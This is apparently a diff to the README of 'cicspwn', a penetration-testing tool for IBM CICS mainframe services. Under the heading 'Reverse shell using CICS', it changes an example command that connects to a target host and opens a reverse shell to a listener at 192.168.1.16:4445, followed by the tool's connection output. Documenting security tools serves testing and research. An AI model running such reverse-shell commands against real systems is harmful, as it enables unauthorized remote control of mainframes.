@@ -115,7 +115,7 @@ root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -i
 ```
 ## Reverse shell using CICS
 ```
-root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -s reverse -l 192.168.1.16:4445
+root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -s reverse_tso -l 192.168.1.16:4445
 [+] Connecting to target 192.168.1.209:23
 [*] Access to CICS Terminal is possible with APPID CICS
 [+] Setting the current terminal to mixed case
